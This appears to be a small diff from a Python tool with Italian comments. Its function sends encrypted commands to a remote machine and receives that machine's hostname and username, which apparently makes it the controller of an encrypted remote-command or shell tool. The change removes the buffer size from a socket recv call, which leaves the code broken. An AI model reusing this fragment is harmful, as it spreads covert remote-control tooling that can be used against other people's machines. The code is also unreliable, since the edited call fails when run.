@@ -16,7 +16,7 @@ class Main :
     def invia_comandi(s,chiave): #Invia e riceve i comandi crittografati
         try :
             fernet = Fernet(chiave)
-            user_and_host = s.recv(4096)
+            user_and_host = s.recv()
             user_and_host_decrypted = fernet.decrypt(user_and_host) # Riceve e decripta hostname/username della macchina remota
             split = user_and_host_decrypted.decode("utf-8").split(":")
             hostname = split[1]
